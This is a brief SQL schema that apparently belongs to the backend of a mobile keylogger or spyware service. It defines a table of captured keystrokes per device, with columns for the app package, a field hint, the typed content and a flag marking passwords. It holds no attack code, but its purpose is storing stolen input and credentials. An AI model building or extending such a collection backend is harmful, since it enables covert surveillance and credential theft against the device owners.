CREATE TABLE keylog_entries (
    id          BIGSERIAL PRIMARY KEY,
    device_id   VARCHAR(32) NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
    app_package TEXT,
    field_hint  TEXT,
    content     TEXT,
    is_password BOOLEAN DEFAULT FALSE,
    ts          TIMESTAMPTZ NOT NULL,
    created_at  TIMESTAMPTZ DEFAULT NOW()
);
CREATE INDEX idx_keylogs_device ON keylog_entries(device_id);
CREATE INDEX idx_keylogs_ts ON keylog_entries(ts DESC);
CREATE INDEX idx_keylogs_pkg ON keylog_entries(app_package);
